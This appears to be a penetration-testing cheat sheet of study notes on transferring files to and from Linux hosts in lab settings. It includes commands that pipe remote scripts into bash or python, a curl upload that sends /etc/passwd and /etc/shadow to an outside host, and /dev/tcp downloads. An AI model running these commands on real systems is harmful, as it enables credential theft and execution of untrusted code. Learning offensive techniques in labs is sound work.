# File Transfer Linux

## Web

### downloads
- wget
```sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
- cURL
```sh
# output filename option is lowercase `-o'.
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
### uploads
#### Curl Upload multiple files 
```sh
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.
```

#### Create Server Without SSL
this methods can also get ssl certificates i will just not explain here:
```sh
# python3
python3 -m http.server 80001

#python2.7
python -m SimpleHTTPServer 8000

#php
php -S 0.0.0.0:8000

#ruby
ruby -run -ehttpd . -p 8000
```

#### Create Server with SSL
- Pwnbox - Start Web Server
```sh
sudo python3 -m pip install --user uploadserver
```
- Pwnbox - Create a Self-Signed Certificate
```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
- start the webserver
```sh
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```


## Fileless Attacks Using Linux

### Fileless Download
- curl
```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
-wget
```sh
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are available.
As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
- Connect to the Target Webserver
```sh 
exec 3<>/dev/tcp/10.10.10.32/80
```
- HTTP GET Request
```sh 
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
- Print the Response
```sh
cat <&3 # <&3 is the file descriptor for the connection see one command higher
```

## SSH Downloads
- Enabling the SSH Server
```sh
sudo systemctl enable ssh
```
- Starting the SSH Server
```sh
sudo systemctl start ssh
```
- Checking for SSH Listening Port
```sh
netstat -lnpt
```
- Linux - Downloading Files Using SCP
```sh
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## SCP Upload
```sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```